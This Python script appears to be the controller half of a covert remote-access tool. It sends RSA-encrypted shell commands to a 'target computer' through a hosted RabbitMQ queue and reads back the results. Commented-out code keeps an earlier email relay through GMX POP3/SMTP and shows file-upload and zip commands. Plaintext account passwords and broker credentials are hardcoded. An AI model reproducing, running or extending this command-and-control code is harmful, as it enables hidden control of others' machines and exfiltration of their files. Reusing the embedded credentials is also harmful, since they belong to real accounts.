from email.mime.multipart import MIMEMultipart
import re
import smtplib
from email.mime.text import MIMEText
from email.header import Header
import poplib
import time
import subprocess
from email.parser import BytesParser
from email.header import decode_header
from email.utils import parseaddr
import smtplib
from email.mime.text import MIMEText
from email.header import Header
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import padding as asymmetric_padding
import pika

def encrypt_with_public_key(public_key_path, data):
    with open(public_key_path, "rb") as f:
        public_key = serialization.load_pem_public_key(
            f.read(),
            backend=default_backend()
        )
    
    max_block_size = public_key.key_size // 8 - 2 * hashes.SHA256.digest_size - 2
    
    data = data.encode('utf-8')
    encrypted_blocks = []
    for i in range(0, len(data), max_block_size):
        block = data[i:i+max_block_size]
        encrypted_block = public_key.encrypt(
            block,
            asymmetric_padding.OAEP(
                mgf=asymmetric_padding.MGF1(algorithm=hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None
            )
        )
        encrypted_blocks.append(encrypted_block)
    
    encrypted_data = b''.join(encrypted_blocks)
    return encrypted_data

def decrypt_with_private_key(private_key_path, encrypted_data):
    with open(private_key_path, "rb") as f:
        private_key = serialization.load_pem_private_key(
            f.read(),
            password=None,
            backend=default_backend()
        )
    
    max_block_size = private_key.key_size // 8
    decrypted_blocks = []
    for i in range(0, len(encrypted_data), max_block_size):
        block = encrypted_data[i:i+max_block_size]
        decrypted_block = private_key.decrypt(
            block,
            asymmetric_padding.OAEP(
                mgf=asymmetric_padding.MGF1(algorithm=hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None
            )
        )
        decrypted_blocks.append(decrypted_block)
    
    decrypted_data = b''.join(decrypted_blocks)
    return decrypted_data.decode('utf-8')

# 解码邮件主题或发件人
def decode_str(s):
    value, charset = decode_header(s)[0]
    if isinstance(value, bytes):
        value = value.decode(charset if charset else 'utf-8')
    return value

# 定义处理新邮件的函数
# def process_new_email(msg, pop3, email_count):
#     msg_parser = BytesParser()
#     email_msg = msg_parser.parsebytes(msg)
    
#     subject = decode_str(email_msg['subject'])
#     sender = decode_str(email_msg['from'])
    
#     if sender == 'filecat2023@gmx.com':
#         # print("收到新邮件！")
#         # print("发件人:", sender)
#         print("SHA1: ", subject)

#         # 获取邮件正文
#         for part in email_msg.walk():
#             if part.get_content_type() == 'text/plain':
#                 body = part.get_payload(decode=True).decode(part.get_content_charset())

#                 # 解密
#                 body = decrypt_with_private_key(private_key_path, bytes.fromhex(body))
#                 print(body)

#                 global is_receive
#                 is_receive = True
#                 if body == "connected" :
#                     global path, symbol
#                     path = "remote"
#                     symbol = "> "

#         # 删除邮件
#         pop3.dele(email_count)

# def receive():
#     # 邮件服务器的地址和端口
#     pop3_server = 'pop.gmx.com'
#     pop3_port = 995
#     # 连接 POP3 服务器
#     pop3 = poplib.POP3_SSL(pop3_server, pop3_port)
#     pop3.user('filecat@gmx.com')
#     pop3.pass_('Kim12138')

#     # 获取邮件列表
#     email_count, _ = pop3.stat()

#     # 如果有新邮件，则获取最新一封邮件
#     if email_count > 0:
#         most_recent_email = pop3.retr(email_count)
#         msg = b'\r\n'.join(most_recent_email[1])
#         process_new_email(msg, pop3, email_count)
#     # print(email_count)
#     pop3.quit()

# def send(body):
#     # rsa加密
#     body = encrypt_with_public_key(public_key_path, body).hex().upper()

#     # 邮件服务器地址和端口
#     smtp_server = 'smtp.gmx.com'
#     smtp_port = 587

#     # 发件人和收件人的邮箱地址
#     sender_email = 'filecat@gmx.com'
#     receiver_email = 'filecat2023@gmx.com'

#     # 邮件内容
#     subject = 'c164ccdb8b83aa03ce843875ec14a7d50d130aee'.upper()

#     # 创建邮件内容
#     msg = MIMEMultipart()
#     msg['From'] = sender_email
#     msg['To'] = receiver_email
#     msg['Subject'] = Header(subject, 'utf-8')
#     msg.attach(MIMEText(body, 'plain', 'utf-8'))
    
#     # 链接到邮件服务器并发送邮件
#     try:
#         server = smtplib.SMTP(smtp_server, smtp_port)
#         server.starttls()  # 启用 TLS
#         server.login(sender_email, "Kim12138")
#         server.sendmail(sender_email, receiver_email, msg.as_string())
#         # print('邮件发送成功')
#     except Exception as e:
#         print(str(e))
#     finally:
#         server.quit()

def receive() :
    global is_receive
    is_receive = False
    username = 'pwuskgvj'
    pwd = 'P400040HF4SoISgwDLB1KDJEVMB_336y'
    user_pwd = pika.PlainCredentials(username, pwd)
    connection = pika.BlockingConnection(pika.ConnectionParameters('gerbil.rmq.cloudamqp.com',5672,'pwuskgvj', credentials=user_pwd))
    channel = connection.channel()
    channel.queue_declare(queue='admin', durable=True)

    def callback(ch, method, properties, body):
        # print(body.decode('utf-8'))
        body = decrypt_with_private_key(private_key_path, bytes.fromhex(body.decode('utf-8')))
        print(body)
        global is_receive
        is_receive = True
        if body == "connected" :
            global path, symbol
            path = "remote"
            symbol = "> "

    channel.basic_consume(queue='admin', on_message_callback=callback, auto_ack=True)

    # 设置一个定时器，比如让程序运行30秒后自动结束
    timeout = time.time() + 30  # 30秒后的时间戳

    while time.time() < timeout:
        connection.process_data_events()  # 处理队列消息事件
        # print(is_receive)
        if is_receive == True :
            break
        time.sleep(1)  # 避免过于频繁的循环

    if time.time() > timeout :
        print("Time Out")

    # 关闭连接
    channel.stop_consuming()
    connection.close()

def is_connect() :
    receive()
    if path == "remote" :
        print("----------connected----------")

def send(message) :
    username = 'pwuskgvj'
    pwd = 'P400040HF4SoISgwDLB1KDJEVMB_336y'
    user_pwd = pika.PlainCredentials(username, pwd)
    s_conn = pika.BlockingConnection(pika.ConnectionParameters('gerbil.rmq.cloudamqp.com',5672,'pwuskgvj', credentials=user_pwd))#创建连接
    chan = s_conn.channel()
    chan.queue_declare(queue='remote',durable=True)

    message = encrypt_with_public_key(public_key_path, message).hex().upper()

    chan.basic_publish(exchange='amq.direct',
                      routing_key='remote',
                      body=message)
    s_conn.close()

#----------main----------

public_key_path = "public_key.pem"
private_key_path = "private_key.pem"
print("disconnect target computer")
is_receive = False
path = "localhost"
symbol = " # "
print("try to connecting...")
send("connect")
is_connect()

while True :
    print(path + symbol, end='')
    cmd = input()
    if cmd == "exit" :
        break
    elif cmd == "connect" :
        send("connect")
        print("---------wating-------------")
        is_connect()
    elif cmd == "getresult" :
        receive()
    elif cmd == "disconnect" :
        send("disconnect")
        print("----------wating-------------")
        receive()
    else :
        # word_list = re.split(r'\s+', cmd)  # 按空格分割
        send(cmd)
        print("----------wating-------------")
        is_receive = False
        receive()
    # elif cmd == "getresult" :
    #     while True :
    #         receive()
    #         if (input() == "exit") :
    #             break
    #         time.sleep(0.5)
    # else :
    #     print(path + symbol + cmd + " ", end='')
    #     detail = input()
    #     if cmd == "list" :
    #         command = "tree " + detail
    #         send(command)
    #     elif cmd == "cd" :
    #         command = "cd " + detail
    #         send(command)
    #         path = "remote@" + detail
    #         symbol = " $ "
    #     elif cmd == "upload" :
    #         command = "python wss.py upload " + detail
    #         send(command)
    #     elif cmd == "zip" :
    #         command = "zip " + detail
    #         send(command)
    #     elif cmd == "upload" :
    #         command = "upload " + detail
    #         send(command)